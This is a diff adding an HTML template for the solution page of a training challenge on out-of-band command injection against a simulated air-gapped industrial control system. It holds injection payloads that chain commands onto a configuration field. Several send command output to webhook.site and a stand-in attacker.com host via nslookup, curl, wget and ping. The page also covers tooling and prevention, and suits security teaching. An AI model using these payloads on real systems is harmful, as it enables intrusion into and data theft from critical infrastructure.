@@ -1,0 +1,106 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Out-of-Band Command Injection - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Out-of-Band Command Injection</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit command injection in an air-gapped industrial control system using out-of-band techniques.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates command injection in an air-gapped industrial control system. Since the system is isolated from the internet, you must use out-of-band techniques to confirm command execution and exfiltrate data.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Test basic injection:</strong> Confirm command injection is possible.</p>
+                        <pre class="bg-light p-3 rounded"><code>network.interface=eth0; whoami</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Set up out-of-band listener:</strong> Use a service like webhook.site to capture data.</p>
+                        <p>Get a unique URL from https://webhook.site/</p>
+                    </li>
+                    <li>
+                        <p><strong>Use DNS exfiltration:</strong> Exfiltrate data via DNS queries.</p>
+                        <pre class="bg-light p-3 rounded"><code>network.interface=eth0; nslookup $(whoami).your-webhook-id.webhook.site</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Use HTTP exfiltration:</strong> Send data via HTTP requests.</p>
+                        <pre class="bg-light p-3 rounded"><code>network.interface=eth0; curl http://webhook.site/your-id/$(whoami)</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Out-of-Band Techniques</h3>
+                <ul>
+                    <li><code>network.interface=eth0; nslookup $(whoami).webhook.site</code> - DNS exfiltration</li>
+                    <li><code>network.interface=eth0; curl http://webhook.site/$(id)</code> - HTTP exfiltration</li>
+                    <li><code>network.interface=eth0; wget http://attacker.com/$(hostname)</code> - HTTP GET request</li>
+                    <li><code>network.interface=eth0; ping -c 1 $(whoami).attacker.com</code> - ICMP exfiltration</li>
+                </ul>
+
+                <h3 class="mt-4">Out-of-Band Tools</h3>
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6>Professional Tools:</h6>
+                        <ul>
+                            <li>Burp Collaborator</li>
+                            <li>OWASP ZAP</li>
+                            <li>Interactsh</li>
+                            <li>DNSBin</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6>Free Services:</h6>
+                        <ul>
+                            <li>Webhook.site</li>
+                            <li>RequestBin</li>
+                            <li>Canary Tokens</li>
+                            <li>DNS Canary</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h3 class="mt-4">Industrial Control Context</h3>
+                <p>Out-of-band techniques are critical for testing:</p>
+                <ul>
+                    <li>Air-gapped industrial systems</li>
+                    <li>SCADA networks</li>
+                    <li>Critical infrastructure</li>
+                    <li>Isolated environments</li>
+                </ul>
+
+                <h3 class="mt-4">Data Exfiltration Methods</h3>
+                <ul>
+                    <li><strong>DNS:</strong> Encode data in DNS queries</li>
+                    <li><strong>HTTP:</strong> Send data via HTTP requests</li>
+                    <li><strong>ICMP:</strong> Use ping with encoded data</li>
+                    <li><strong>Time-based:</strong> Use timing to encode information</li>
+                </ul>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>Network Segmentation:</strong> Properly isolate critical systems</li>
+                    <li><strong>Egress Filtering:</strong> Block outbound connections</li>
+                    <li><strong>DNS Monitoring:</strong> Monitor DNS queries for anomalies</li>
+                    <li><strong>Input Validation:</strong> Validate all configuration inputs</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level20') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
